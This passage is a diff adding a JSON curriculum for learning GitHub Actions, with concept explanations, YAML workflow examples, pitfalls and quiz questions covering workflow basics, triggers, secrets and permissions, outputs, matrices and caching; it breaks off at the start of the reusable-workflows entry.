@@ -1,0 +1,731 @@
+{
+ "tool": {
+  "id": "github-actions",
+  "name": "GitHub Actions",
+  "category": "tool",
+  "tagline": "CI/CD and automation built into GitHub, driven by YAML workflows",
+  "description": "GitHub Actions runs workflows defined as YAML files in your repository whenever something happens on GitHub: a push, a pull request, a schedule or a manual click. Teams use it to build and test every change, publish packages and deploy to the cloud. Because it lives next to the code and has a huge marketplace of reusable actions, it is the default CI/CD system for most projects hosted on GitHub.",
+  "icon": "GA",
+  "color": "#2088FF",
+  "official_docs": "https://docs.github.com/en/actions",
+  "version": "2026 (checkout v7, ubuntu-24.04 runners)",
+  "aliases": [
+   "gh actions",
+   "github workflows",
+   "actions",
+   "gha"
+  ],
+  "requires": [
+   {
+    "tool": "git",
+    "level": 1
+   }
+  ]
+ },
+ "modules": [
+  {
+   "id": "basics",
+   "name": "Workflow basics"
+  },
+  {
+   "id": "jobs",
+   "name": "Triggers and jobs"
+  },
+  {
+   "id": "data",
+   "name": "Expressions, secrets and outputs"
+  },
+  {
+   "id": "speed",
+   "name": "Matrices, caching and artifacts"
+  },
+  {
+   "id": "reuse",
+   "name": "Reuse and deployment"
+  },
+  {
+   "id": "scale",
+   "name": "Security, runners and internals"
+  }
+ ],
+ "concepts": [
+  {
+   "id": "github-actions.what-is-actions",
+   "name": "What GitHub Actions is",
+   "module": "basics",
+   "level": 1,
+   "minutes": 6,
+   "summary": "Workflows, events, jobs, steps and runners: the five words that describe every GitHub Actions setup.",
+   "why": "You need the vocabulary before any YAML makes sense, and it tells you where each piece of work actually runs.",
+   "body": "**GitHub Actions** is GitHub's automation service. You describe automation in **workflow** files, YAML stored in `.github/workflows/` in the repository, and GitHub runs them when an **event** happens: a push, a pull request being opened, a release, a cron schedule or a manual button press.\n\nA workflow contains one or more **jobs**. Each job runs on a **runner**, a fresh virtual machine (or container) that GitHub provisions for that job only: `ubuntu-latest`, `windows-latest` or `macos-latest`, or a machine you host yourself. Jobs run in parallel by default and do not share a file system.\n\nA job is a list of **steps** executed in order on the same runner, so steps do share files. A step either runs a shell command (`run:`) or calls an **action** (`uses:`), a reusable unit such as `actions/checkout` that clones your repository.\n\n- Event: what starts the workflow.\n- Job: a group of steps on one runner.\n- Step: one command or action.\n- Runner: the machine that executes a job.\n\nFor public repositories the standard hosted runners are free; private repositories get a monthly allowance of minutes. Every run is shown in the repository's **Actions** tab with logs per step, and its status appears as a check on commits and pull requests, which is what makes Actions useful as CI.",
+   "code": "# .github/workflows/hello.yml\nname: Hello              # shown in the Actions tab\non: push                 # event\njobs:\n  greet:                 # job id\n    runs-on: ubuntu-latest   # runner\n    steps:\n      - uses: actions/checkout@v7      # step using an action\n      - run: echo \"Hello from $GITHUB_REPOSITORY\"   # step running a command\n      - run: ls                         # sees the checked-out files",
+   "code_lang": "yaml",
+   "takeaways": [
+    "Workflows are YAML files in .github/workflows/",
+    "An event starts a workflow; a workflow has jobs; a job has steps",
+    "Each job gets a fresh runner; steps in one job share its files"
+   ],
+   "pitfalls": [
+    "Expecting two jobs to see each other's files: they run on different machines."
+   ],
+   "quiz": [
+    {
+     "q": "Two steps in the same job and two jobs in the same workflow: which pair shares a file system?",
+     "options": [
+      "Both pairs",
+      "Only the two jobs",
+      "Only the two steps",
+      "Neither pair"
+     ],
+     "answer": 2,
+     "explain": "Steps run sequentially on one runner; each job gets its own fresh runner."
+    }
+   ],
+   "docs": "https://docs.github.com/en/actions/get-started/understand-github-actions",
+   "requires": []
+  },
+  {
+   "id": "github-actions.first-workflow",
+   "name": "Your first workflow file",
+   "module": "basics",
+   "level": 1,
+   "minutes": 10,
+   "summary": "Write a CI workflow that checks out the code, installs dependencies and runs the tests on every push and pull request.",
+   "why": "A build-and-test workflow on every change is the single most valuable thing Actions does for a project.",
+   "body": "A workflow file has three top-level keys you will always write: `name` (optional label), `on` (the triggering events) and `jobs`.\n\nEach job needs `runs-on`, the runner label, and `steps`. A typical CI job follows the same recipe in every language:\n\n- `actions/checkout` to clone the commit that triggered the run (the runner starts empty).\n- A `setup-*` action such as `actions/setup-node` or `actions/setup-python` to install a toolchain version.\n- `run:` steps to install dependencies, lint and test.\n\nA `run` step executes in `bash` on Linux and macOS runners (with `-e`, so the first failing command fails the step) and in PowerShell on Windows. A multi-line command uses the YAML block scalar `|`. Any step that exits non-zero fails the job, marks the run red and, by default, skips the remaining steps.\n\nCommit the file and push: the run appears under the **Actions** tab within seconds. With `on: [push, pull_request]` the result also shows up as a check on pull requests, and branch protection can require it to pass before merging.\n\nSteps can be given a `name` for readable logs and a `working-directory` when the project lives in a subfolder. Keep CI workflows fast and boring: the same commands a developer runs locally, in the same order.",
+   "code": "name: CI\non: [push, pull_request]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/setup-node@v7\n        with:\n          node-version: 22\n      - name: Install\n        run: npm ci\n      - name: Lint and test\n        run: |\n          npm run lint\n          npm test",
+   "code_lang": "yaml",
+   "takeaways": [
+    "Checkout, set up a toolchain, then run your commands",
+    "A non-zero exit code fails the step and the job",
+    "Use | for multi-line run scripts"
+   ],
+   "pitfalls": [
+    "Forgetting actions/checkout and wondering why the repository files are missing."
+   ],
+   "quiz": [
+    {
+     "q": "A run step contains three commands on separate lines and the second one fails. What happens on a Linux runner?",
+     "options": [
+      "The step fails at the second command and later steps are skipped",
+      "All three run and the step passes",
+      "Only the last command's exit code counts",
+      "The job is retried automatically"
+     ],
+     "answer": 0,
+     "explain": "Linux run steps use bash with -e, so the first failing command fails the step, and following steps are skipped by default."
+    }
+   ],
+   "docs": "https://docs.github.com/en/actions/writing-workflows/quickstart",
+   "requires": [
+    "github-actions.what-is-actions",
+    "git.push-pull"
+   ]
+  },
+  {
+   "id": "github-actions.using-actions",
+   "name": "Using actions from the Marketplace",
+   "module": "basics",
+   "level": 1,
+   "minutes": 8,
+   "summary": "Call reusable actions with uses:, pass them inputs with with:, and pin them to a version you trust.",
+   "why": "Most workflow steps are someone else's action; knowing how to choose and pin them keeps builds stable and safe.",
+   "body": "An **action** is a reusable step published in a repository. You reference it as `owner/repo@ref`, for example `actions/checkout@v7`, and GitHub downloads it at the start of the job. The `ref` can be:\n\n- a major version tag like `v5` (gets compatible updates automatically),\n- an exact tag like `v5.0.0`,\n- a full commit SHA, the only reference that cannot be moved by the action's owner.\n\nInputs go under `with:`; each action documents its inputs in its `action.yml` and README. Some actions also set **outputs** that later steps can read. A local action in your own repository is referenced by path: `uses: ./.github/actions/setup`.\n\n`actions/checkout` deserves special attention. By default it fetches only the triggering commit (`fetch-depth: 1`), which is fast but means `git describe` or history-based tools see no history; set `fetch-depth: 0` for full history. It also persists the job's token so later steps can run authenticated git commands such as `git push`; set `persist-credentials: false` if they don't need to.\n\nThe `actions/` organization is maintained by GitHub. For third-party actions, check the source, the maintainer and how widely it is used: an action runs with access to your workspace and whatever secrets you pass it.",
+   "code": "steps:\n  - uses: actions/checkout@v7\n    with:\n      fetch-depth: 0              # full history for git describe\n      persist-credentials: false\n  - run: git describe --tags --always   # e.g. v1.4.2-3-g1a2b3c4\n  - uses: actions/setup-python@v7\n    with:\n      python-version: \"3.13\"\n  # third-party action pinned to a full commit SHA (comment records the tag)\n  - uses: owner/some-action@0123456789abcdef0123456789abcdef01234567 # v2.1.0",
+   "code_lang": "yaml",
+   "takeaways": [
+    "uses: owner/repo@ref runs an action; with: passes inputs",
+    "Major tags auto-update; a full SHA pins exactly",
+    "checkout fetches one commit unless fetch-depth: 0"
+   ],
+   "pitfalls": [
+    "Quoting versions is needed for YAML: python-version: 3.10 becomes the number 3.1."
+   ],
+   "quiz": [
+    {
+     "q": "Which reference guarantees the action code cannot change under you?",
+     "options": [
+      "@main",
+      "@v4",
+      "@v4.1.0",
+      "A full 40-character commit SHA"
+     ],
+     "answer": 3,
+     "explain": "Branches and tags can be moved; a commit SHA identifies immutable content."
+    }
+   ],
+   "docs": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-pre-written-building-blocks-in-your-workflow",
+   "requires": [
+    "github-actions.first-workflow",
+    "git.init-clone"
+   ]
+  },
+  {
+   "id": "github-actions.triggers",
+   "name": "Triggers: push, pull_request, schedule, manual",
+   "module": "jobs",
+   "level": 1,
+   "minutes": 10,
+   "summary": "Control when a workflow runs with event filters on branches and paths, cron schedules and manual workflow_dispatch inputs.",
+   "why": "Running the right workflow at the right time saves minutes and keeps deploys from firing on the wrong branch.",
+   "body": "The `on` key lists events, optionally with filters.\n\n- `push` and `pull_request` accept `branches`, `tags` and `paths` filters (and `-ignore` variants). For `pull_request` the branch filter matches the **target** branch, so `branches: [main]` means \"PRs into main\".\n- `pull_request` has activity `types`; the default is `opened`, `synchronize` (new commits) and `reopened`.\n- `schedule` takes cron expressions in **UTC**, minimum every 5 minutes, and runs on the default branch only. Scheduled runs can start late under load.\n- `workflow_dispatch` adds a **Run workflow** button (and API/CLI trigger) with optional typed `inputs`, read as `inputs.name`.\n- Others include `release`, `workflow_run` (after another workflow finishes), `issues` and `repository_dispatch` for external webhooks.\n\nGlob patterns in filters use `*` (no slash) and `**` (any depth). When both `branches` and `paths` are given, both must match.\n\nA `pull_request` run checks out a temporary **merge commit** of the PR into the base branch, so tests see what main would look like after merging. Workflows triggered by pull requests from forks get a read-only token and no secrets, which is a deliberate safety measure.",
+   "code": "on:\n  push:\n    branches: [main, \"release/**\"]\n    paths: [\"src/**\", \"package.json\"]\n  pull_request:\n    branches: [main]          # PRs targeting main\n  schedule:\n    - cron: \"30 2 * * 1\"      # Mondays 02:30 UTC\n  workflow_dispatch:\n    inputs:\n      environment:\n        type: choice\n        options: [staging, production]\n        default: staging\njobs:\n  show:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"event=${{ github.event_name }} env=${{ inputs.environment }}\" ",
+   "code_lang": "yaml",
+   "takeaways": [
+    "push/pull_request filter on branches, tags and paths",
+    "Cron schedules are UTC and run on the default branch",
+    "workflow_dispatch adds a manual button with typed inputs"
+   ],
+   "pitfalls": [
+    "Expecting a schedule in a feature branch's workflow file to run: only the default branch's copy is used."
+   ],
+   "quiz": [
+    {
+     "q": "With on: pull_request: branches: [main], which PRs trigger the workflow?",
+     "options": [
+      "PRs whose head branch is named main",
+      "PRs that target main",
+      "Every PR",
+      "Only PRs from forks"
+     ],
+     "answer": 1,
+     "explain": "For pull_request events, the branches filter matches the base (target) branch."
+    }
+   ],
+   "docs": "https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows",
+   "requires": [
+    "github-actions.first-workflow"
+   ]
+  },
+  {
+   "id": "github-actions.jobs-needs",
+   "name": "Multiple jobs and needs",
+   "module": "jobs",
+   "level": 1,
+   "minutes": 8,
+   "summary": "Split a workflow into parallel jobs and order them with needs to build a simple pipeline.",
+   "why": "Real pipelines lint, test and deploy in separate jobs; needs is how you express what waits for what.",
+   "body": "Jobs in a workflow start **in parallel**. To order them, a job lists the jobs it depends on in `needs`. GitHub builds a graph from these edges: a job starts when all of its needs have succeeded, and if one of them fails the dependent job is **skipped**.\n\n```yaml\ndeploy:\n  needs: [lint, test]\n```\n\nBecause each job runs on a fresh runner, anything a later job needs must be passed explicitly: build files go through **artifacts**, small values through **job outputs**, both covered later. Each job also re-checks out the code.\n\nUseful job-level keys:\n\n- `runs-on`: different jobs can use different operating systems.\n- `timeout-minutes`: the default is 360 minutes, far too long for most CI. Set something realistic.\n- `if:`: skip the job conditionally, for example only deploy from `main`.\n- `continue-on-error: true`: let the workflow succeed even if this job fails (for experimental checks).\n- `container:` and `services:`: run the job inside a Docker image, or start side containers such as a database for tests (Linux runners only).\n\nThe Actions UI draws the graph, so a good structure doubles as documentation: fast checks first, slow or privileged jobs only after them.",
+   "code": "jobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps: [{uses: actions/checkout@v7}, {run: make lint}]\n  test:\n    runs-on: ubuntu-latest\n    timeout-minutes: 15\n    services:\n      postgres:\n        image: postgres:17\n        env: {POSTGRES_PASSWORD: pw}\n        ports: [\"5432:5432\"]\n    steps: [{uses: actions/checkout@v7}, {run: make test}]\n  deploy:\n    needs: [lint, test]        # waits for both; skipped if either fails\n    if: github.ref == 'refs/heads/main'\n    runs-on: ubuntu-latest\n    steps: [{run: echo deploying}]",
+   "code_lang": "yaml",
+   "takeaways": [
+    "Jobs run in parallel unless needs orders them",
+    "A failed dependency skips the dependent job",
+    "Set timeout-minutes; the default is 6 hours"
+   ],
+   "pitfalls": [
+    "Writing files in one job and expecting the next job to find them on disk."
+   ],
+   "quiz": [
+    {
+     "q": "Job C has needs: [A, B]. A succeeds, B fails. What happens to C?",
+     "options": [
+      "C runs because A succeeded",
+      "C is skipped",
+      "C runs and then fails",
+      "C waits until B is re-run"
+     ],
+     "answer": 1,
+     "explain": "By default a job only runs when all of its needs succeeded."
+    }
+   ],
+   "docs": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-jobs-in-a-workflow",
+   "requires": [
+    "github-actions.first-workflow"
+   ]
+  },
+  {
+   "id": "github-actions.variables-env",
+   "name": "Environment and configuration variables",
+   "module": "jobs",
+   "level": 1,
+   "minutes": 8,
+   "summary": "Set env at workflow, job and step level, read GitHub's default variables, and store non-secret settings as configuration variables.",
+   "why": "Almost every workflow needs settings and runtime facts like the branch or commit, and env is how scripts receive them.",
+   "body": "The `env` key defines environment variables at three scopes: workflow, job and step. The narrowest scope wins. Inside `run:` scripts they are ordinary shell variables (`$NAME` in bash).\n\nGitHub also sets **default variables** on every runner, including:\n\n- `GITHUB_SHA`: the commit being built.\n- `GITHUB_REF` and `GITHUB_REF_NAME`: e.g. `refs/heads/main` and `main`.\n- `GITHUB_REPOSITORY`, `GITHUB_RUN_ID`, `GITHUB_WORKSPACE` (the checkout directory), `RUNNER_OS`.\n- `CI=true`, which many tools use to switch to non-interactive mode.\n\nThere are two ways to refer to a value. `$GITHUB_SHA` is expanded by the **shell** on the runner. `${{ github.sha }}` is an **expression** that GitHub substitutes into the YAML before the step runs; expressions are needed where no shell is involved, such as in `with:` inputs or `if:` conditions.\n\nFor settings that differ per repository or environment but are not secret (a region, an app name), use **configuration variables** defined under Settings, Secrets and variables, Actions, Variables. Read them as `${{ vars.NAME }}`. They can be set at organization, repository or environment level. Anything sensitive belongs in secrets instead.",
+   "code": "env:                        # whole workflow\n  APP: shop\njobs:\n  build:\n    runs-on: ubuntu-latest\n    env:\n      STAGE: test             # this job\n    steps:\n      - run: echo \"$APP $STAGE on $GITHUB_REF_NAME at ${GITHUB_SHA::7}\"\n        # shop test on main at 1a2b3c4\n      - run: echo \"$STAGE\"    # prod (step scope wins)\n        env:\n          STAGE: prod\n      - uses: actions/setup-node@v7\n        with:\n          node-version: ${{ vars.NODE_VERSION }}   # repo configuration variable",
+   "code_lang": "yaml",
+   "takeaways": [
+    "env at workflow, job or step scope; the narrowest wins",
+    "$VAR is expanded by the shell, ${{ }} by GitHub before the step runs",
+    "vars.* holds non-secret settings; secrets.* holds sensitive ones"
+   ],
+   "pitfalls": [
+    "Using $VAR inside with: inputs: no shell runs there, so it stays a literal string."
+   ],
+   "quiz": [
+    {
+     "q": "Where must you use ${{ env.X }} instead of $X?",
+     "options": [
+      "Inside a bash run script",
+      "Only in Windows runners",
+      "Nowhere, they are identical",
+      "In a with: input of an action"
+     ],
+     "answer": 3,
+     "explain": "with: values are not processed by a shell, so only expression syntax is substituted."
+    }
+   ],
+   "docs": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/store-information-in-variables",
+   "requires": [
+    "github-actions.first-workflow"
+   ]
+  },
+  {
+   "id": "github-actions.expressions-contexts",
+   "name": "Expressions, contexts and if conditions",
+   "module": "data",
+   "level": 2,
+   "minutes": 12,
+   "summary": "Use ${{ }} expressions with the github, env, steps and needs contexts, and status functions like failure() in if conditions.",
+   "why": "Conditions and context data are how one workflow behaves differently for PRs, branches and failures.",
+   "body": "An **expression** `${{ ... }}` is evaluated by GitHub, not by the shell. It can read **contexts**, objects describing the run:\n\n- `github`: event name, ref, sha, actor, repository and the full webhook payload in `github.event`.\n- `env`, `vars`, `secrets`, `inputs`: values you defined.\n- `steps.<id>.outputs` and `steps.<id>.outcome`: results of earlier steps (give the step an `id`).\n- `needs.<job>.outputs` and `needs.<job>.result`: results of jobs listed in `needs`.\n- `matrix`, `runner`, `job`.\n\nExpressions support `==`, `!=`, `&&`, `||`, `!` and functions such as `contains()`, `startsWith()`, `format()`, `join()`, `toJSON()`, `fromJSON()` and `hashFiles()`. String comparison is case-insensitive.\n\nIn `if:` keys the `${{ }}` wrapper is optional. A step's `if` implicitly includes `success()`, meaning \"all previous steps succeeded\". The **status functions** change that:\n\n- `failure()`: run only if an earlier step failed (notifications, uploading logs).\n- `always()`: run regardless, even after cancellation.\n- `cancelled()`: run only when the run was cancelled.\n- `!cancelled()`: run after success or failure but not cancellation, usually better than `always()` for cleanup.\n\nDebugging tip: dump a context with `echo '${{ toJSON(github.event) }}'` to see exactly what you can use, but never do this with `secrets`.",
+   "code": "steps:\n  - id: tests\n    run: npm test\n  - if: failure() && steps.tests.outcome == 'failure'\n    run: echo \"Tests failed on ${{ github.ref_name }}\"\n  - if: github.event_name == 'pull_request' && contains(github.event.pull_request.labels.*.name, 'preview')\n    run: echo \"Building preview for PR ${{ github.event.number }}\"\n  - if: ${{ !cancelled() }}\n    run: echo \"always tidy up (unless cancelled)\"\n  - if: startsWith(github.ref, 'refs/tags/v')\n    run: echo \"release ${{ github.ref_name }}\" ",
+   "code_lang": "yaml",
+   "takeaways": [
+    "Contexts expose the event, steps, needs, matrix and your variables",
+    "if: implies success() unless you use a status function",
+    "Prefer !cancelled() to always() for cleanup steps"
+   ],
+   "pitfalls": [
+    "Writing if: ! startsWith(...) without ${{ }}: a leading ! is YAML syntax, so wrap it in ${{ }}."
+   ],
+   "quiz": [
+    {
+     "q": "A step has if: github.ref == 'refs/heads/main'. An earlier step failed. Does it run?",
+     "options": [
+      "No, because success() is implied and an earlier step failed",
+      "Yes, the condition is true on main",
+      "Only if continue-on-error is set on the job",
+      "It runs but is marked skipped"
+     ],
+     "answer": 0,
+     "explain": "Unless a status function is used, success() is added implicitly to every if condition."
+    }
+   ],
+   "docs": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions",
+   "requires": [
+    "github-actions.variables-env",
+    "github-actions.jobs-needs"
+   ]
+  },
+  {
+   "id": "github-actions.secrets-token",
+   "name": "Secrets, GITHUB_TOKEN and permissions",
+   "module": "data",
+   "level": 2,
+   "minutes": 12,
+   "summary": "Store credentials as encrypted secrets, use the automatic GITHUB_TOKEN, and restrict its permissions.",
+   "why": "Deploying or publishing needs credentials, and leaking or over-privileging them is the biggest CI security risk.",
+   "body": "**Secrets** are encrypted values stored at organization, repository or environment level. Read them as `${{ secrets.NAME }}` and pass them to steps through `env` or `with`. GitHub masks secret values in logs, printing `***` if they appear verbatim. Masking cannot catch transformed values (base64 encoded, split), so never print or echo secrets.\n\nEvery job also receives a **GITHUB_TOKEN**, an installation token created for that job that expires when the job finishes. It authenticates `git push`, the `gh` CLI and the REST API against the current repository: `${{ secrets.GITHUB_TOKEN }}` or `${{ github.token }}`.\n\nIts rights are set by the `permissions` key, at workflow or job level. Once you specify `permissions`, every scope you don't list becomes `none`. Best practice is to start from `contents: read` and grant per job only what is needed, for example `pull-requests: write` to comment on PRs or `packages: write` to push images to GHCR. New repositories default to a read-only token.\n\nSecurity rules worth remembering:\n\n- Pull requests from forks get no secrets and a read-only token.\n- Events created with the GITHUB_TOKEN (such as a push) do not trigger new workflow runs, which prevents infinite loops. Use a GitHub App token if you need that.\n- Secrets are not available in `if:` conditions directly; check them via an env variable.",
+   "code": "permissions:\n  contents: read              # default for every job in this workflow\njobs:\n  label:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      pull-requests: write    # only this job may write to PRs\n    steps:\n      - run: gh pr comment \"$PR\" --body \"Build passed\"\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          PR: ${{ github.event.pull_request.html_url }}\n      - run: ./deploy.sh\n        env:\n          API_KEY: ${{ secrets.DEPLOY_API_KEY }}   # shown as *** if printed",
+   "code_lang": "yaml",
+   "takeaways": [
+    "secrets.* are encrypted, masked in logs and absent for fork PRs",
+    "GITHUB_TOKEN is per-job and short-lived; scope it with permissions",
+    "Listing permissions sets every unlisted scope to none"
+   ],
+   "pitfalls": [
+    "Relying on masking: an encoded or partial secret is printed in clear text."
+   ],
+   "quiz": [
+    {
+     "q": "Your workflow pushes a commit using GITHUB_TOKEN. Will that push trigger your on: push workflows?",
+     "options": [
+      "Yes, like any push",
+      "Only if the workflow has permissions: write-all",
+      "No, events made with GITHUB_TOKEN don't start new runs",
+      "Only on the default branch"
+     ],
+     "answer": 2,
+     "explain": "GitHub suppresses workflow triggers from GITHUB_TOKEN actions to avoid recursive runs."
+    }
+   ],
+   "docs": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions",
+   "requires": [
+    "github-actions.expressions-contexts"
+   ]
+  },
+  {
+   "id": "github-actions.outputs",
+   "name": "Step outputs, job outputs and summaries",
+   "module": "data",
+   "level": 2,
+   "minutes": 10,
+   "summary": "Pass values between steps with GITHUB_OUTPUT and GITHUB_ENV, between jobs with job outputs, and write a run summary.",
+   "why": "Pipelines constantly need to hand a computed version, tag or path to the next step or job.",
+   "body": "Steps communicate by appending to special files whose paths GitHub puts in environment variables:\n\n- `GITHUB_OUTPUT`: `echo \"name=value\" >> \"$GITHUB_OUTPUT\"` sets an output of the current step, read later as `steps.<id>.outputs.name`.\n- `GITHUB_ENV`: `echo \"NAME=value\" >> \"$GITHUB_ENV\"` makes `NAME` an environment variable for all **following** steps of the job (not the current one).\n- `GITHUB_PATH`: append a directory to put it on `PATH` for later steps.\n- `GITHUB_STEP_SUMMARY`: Markdown appended here appears on the run's summary page; great for test reports.\n\nTo pass a value to another job, declare it under the job's `outputs`, mapping it from a step output, then read it in the dependent job as `needs.<job>.outputs.<name>`. Job outputs are strings, limited to 1 MB per job; use artifacts for files.\n\nMulti-line values need a delimiter syntax:\n\n```bash\n{ echo \"notes<<EOF\"; cat notes.txt; echo \"EOF\"; } >> \"$GITHUB_OUTPUT\"\n```\n\nThe old `::set-output` workflow command is deprecated; always use the files above. Outputs that contain secrets are masked and may be dropped when passed between jobs.",
+   "code": "jobs:\n  version:\n    runs-on: ubuntu-latest\n    outputs:\n      tag: ${{ steps.v.outputs.tag }}      # expose step output as job output\n    steps:\n      - id: v\n        run: echo \"tag=v1.$GITHUB_RUN_NUMBER\" >> \"$GITHUB_OUTPUT\"\n      - run: echo \"BUILT_AT=$(date -u +%F)\" >> \"$GITHUB_ENV\"\n      - run: echo \"### Built ${{ steps.v.outputs.tag }} on $BUILT_AT\" >> \"$GITHUB_STEP_SUMMARY\"\n  publish:\n    needs: version\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Publishing ${{ needs.version.outputs.tag }}\"   # Publishing v1.42",
+   "code_lang": "yaml",
+   "takeaways": [
+    "Step output: append name=value to $GITHUB_OUTPUT",
+    "GITHUB_ENV affects later steps only",
+    "Cross-job values go through job outputs and needs.<job>.outputs"
+   ],
+   "pitfalls": [
+    "Reading a GITHUB_ENV variable in the same step that set it: it is only visible from the next step."
+   ],
+   "quiz": [
+    {
+     "q": "How does job B read output tag set by a step in job A?",
+     "options": [
+      "steps.A.outputs.tag",
+      "It can't; jobs share nothing",
+      "env.tag",
+      "needs.A.outputs.tag, after A maps it under outputs:"
+     ],
+     "answer": 3,
+     "explain": "Job A must declare the job output, and B must list A in needs."
+    }
+   ],
+   "docs": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/passing-information-between-jobs",
+   "requires": [
+    "github-actions.expressions-contexts"
+   ]
+  },
+  {
+   "id": "github-actions.matrix",
+   "name": "Matrix builds",
+   "module": "speed",
+   "level": 2,
+   "minutes": 10,
+   "summary": "Run one job definition across many combinations of OS, language versions and settings with strategy.matrix.",
+   "why": "Testing every supported platform and version by hand is impossible; a matrix does it in parallel from a few lines.",
+   "body": "`strategy.matrix` turns one job into many. Each key is a variable with a list of values, and GitHub creates one job per combination, reading values as `${{ matrix.<key> }}`.\n\n```yaml\nstrategy:\n  matrix:\n    os: [ubuntu-latest, windows-latest, macos-latest]\n    node: [22, 24]\n```\n\nThat is 3 x 2 = 6 jobs. Fine-tuning:\n\n- `include`: add extra combinations or add keys to matching ones (for example an `experimental: true` flag).\n- `exclude`: drop specific combinations.\n- `fail-fast` (default `true`): cancel the remaining matrix jobs when one fails. Set `false` to see every failure.\n- `max-parallel`: limit how many run at once.\n\nA matrix can generate up to 256 jobs per workflow run. Name the job with matrix values, `name: test (${{ matrix.os }}, node ${{ matrix.node }})`, so failures are readable. If branch protection requires a check, it must name the exact job names produced by the matrix.\n\nThe matrix can also be **dynamic**: one job computes a JSON list and outputs it, and the next uses `matrix: ${{ fromJSON(needs.plan.outputs.targets) }}`, which is how monorepos test only the packages that changed.",
+   "code": "jobs:\n  test:\n    name: test (${{ matrix.os }}, py ${{ matrix.python }})\n    runs-on: ${{ matrix.os }}\n    strategy:\n      fail-fast: false\n      matrix:\n        os: [ubuntu-latest, macos-latest]\n        python: [\"3.13\", \"3.14\"]\n        exclude:\n          - os: macos-latest\n            python: \"3.13\"\n        include:\n          - os: ubuntu-latest\n            python: \"3.15\"\n            experimental: true\n    continue-on-error: ${{ matrix.experimental == true }}\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/setup-python@v7\n        with: {python-version: \"${{ matrix.python }}\"}\n      - run: python -m pytest       # 4 jobs in total",
+   "code_lang": "yaml",
+   "takeaways": [
+    "Each matrix combination is a separate parallel job",
+    "include adds or extends combinations; exclude removes them",
+    "fail-fast: false shows every failing combination"
+   ],
+   "pitfalls": [
+    "Unquoted versions like 3.10 become the number 3.1 in YAML."
+   ],
+   "quiz": [
+    {
+     "q": "matrix: os: [a, b], v: [1, 2, 3] with exclude of one combination. How many jobs run?",
+     "options": [
+      "6",
+      "5",
+      "4",
+      "3"
+     ],
+     "answer": 1,
+     "explain": "2 x 3 = 6 combinations, minus one excluded, gives 5 jobs."
+    }
+   ],
+   "docs": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/running-variations-of-jobs-in-a-workflow",
+   "requires": [
+    "github-actions.jobs-needs",
+    "github-actions.expressions-contexts"
+   ]
+  },
+  {
+   "id": "github-actions.cache-artifacts",
+   "name": "Caching dependencies and sharing artifacts",
+   "module": "speed",
+   "level": 2,
+   "minutes": 12,
+   "summary": "Speed up builds with actions/cache or setup-* caching, and hand files between jobs or to people with artifacts.",
+   "why": "Caching often halves CI time, and artifacts are the only way to pass build output between jobs.",
+   "body": "**Caches** and **artifacts** both store files, for different purposes.\n\nA **cache** is an optimization: dependencies that can be recreated if missing. `actions/cache` saves a path under a `key` at the end of a job and restores it at the start of later runs. Build the key from a hash of the lockfile, `${{ runner.os }}-npm-${{ hashFiles('package-lock.json') }}`, so it changes when dependencies change. `restore-keys` lists prefixes to fall back to a partial match. Easier still, most `setup-*` actions have a built-in `cache:` input. Caches are scoped to a branch with fallback to the default branch, evicted after 7 days unused, and limited in total size per repository.\n\nAn **artifact** is an output: build results, test reports, coverage. `actions/upload-artifact` stores files with the run; `actions/download-artifact` fetches them in a later job of the same run, and people can download them from the run page. Set `retention-days` to control storage costs. Since v4, artifact names must be unique within a run, so matrix jobs should include the matrix values in the name.\n\nRule of thumb: if losing it only makes the build slower, it's a cache; if a later job or a human needs it, it's an artifact.",
+   "code": "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/setup-node@v7\n        with: {node-version: 22, cache: npm}   # caches ~/.npm by lockfile hash\n      - run: npm ci && npm run build\n      - uses: actions/upload-artifact@v7\n        with:\n          name: dist\n          path: dist/\n          retention-days: 5\n  deploy:\n    needs: build\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/download-artifact@v8\n        with: {name: dist, path: dist}\n      - run: ls dist          # index.html assets/ ...",
+   "code_lang": "yaml",
+   "takeaways": [
+    "Cache = recreatable dependencies keyed by a lockfile hash",
+    "Artifact = outputs passed to later jobs or people",
+    "setup-* actions have a built-in cache input"
+   ],
+   "pitfalls": [
+    "Caching node_modules instead of the package manager's download cache, which breaks across Node versions."
+   ],
+   "quiz": [
+    {
+     "q": "Which belongs in an artifact rather than a cache?",
+     "options": [
+      "Compiled binaries the deploy job must ship",
+      "The pip download cache",
+      "~/.npm",
+      "A Gradle dependency directory"
+     ],
+     "answer": 0,
+     "explain": "Build outputs needed by another job must be passed as artifacts; caches may be evicted at any time."
+    }
+   ],
+   "docs": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows",
+   "requires": [
+    "github-actions.using-actions",
+    "github-actions.jobs-needs"
+   ]
+  },
+  {
+   "id": "github-actions.reusable-workflows",
+   "name": "Reusable workflows",
+   "module": "reuse",
+   "level": 3,
+   "minutes": 12,
+   "summary": "Share whole pipelines across repositories with workflow_call, typed inputs, secrets and outputs.",
+   "why": "Organizations with dozens of repositories need one maintained CI definition instead of copy-pasted YAML.",
